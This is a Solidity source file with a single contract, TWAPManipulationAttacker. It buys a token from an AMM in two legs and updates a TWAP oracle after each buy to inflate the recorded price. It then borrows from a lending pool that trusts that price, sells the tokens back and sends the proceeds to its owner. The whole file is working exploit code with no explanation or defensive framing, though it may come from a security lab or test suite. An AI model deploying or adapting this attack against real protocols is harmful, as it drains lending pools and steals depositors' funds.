// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISimpleAMM {
    function swapETHForToken() external payable returns (uint256 tokenOut);
    function swapTokenForETH(uint256 tokenIn) external returns (uint256 ethOut);
}

interface ITWAPOracle {
    function update() external;
}

interface ILendingPoolTWAP {
    function borrow(uint256 ethAmount) external;
}

contract TWAPManipulationAttacker {
    ISimpleAMM public immutable amm;
    ITWAPOracle public immutable twapOracle;
    ILendingPoolTWAP public immutable lendingPool;
    IERC20 public immutable token;
    address public immutable owner;

    constructor(address _amm, address _twap, address _lendingPool, address _token) {
        amm = ISimpleAMM(_amm);
        twapOracle = ITWAPOracle(_twap);
        lendingPool = ILendingPoolTWAP(_lendingPool);
        token = IERC20(_token);
        owner = msg.sender;
    }

    function attack(uint256 borrowAmount) external payable {
        uint256 firstLeg = (msg.value * 8) / 10;

        uint256 tokens1 = amm.swapETHForToken{value: firstLeg}();
        twapOracle.update();

        uint256 secondLeg = address(this).balance;
        uint256 tokens2 = amm.swapETHForToken{value: secondLeg}();
        twapOracle.update();

        lendingPool.borrow(borrowAmount);

        uint256 totalTokens = tokens1 + tokens2;
        token.approve(address(amm), totalTokens);
        amm.swapTokenForETH(totalTokens);

        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
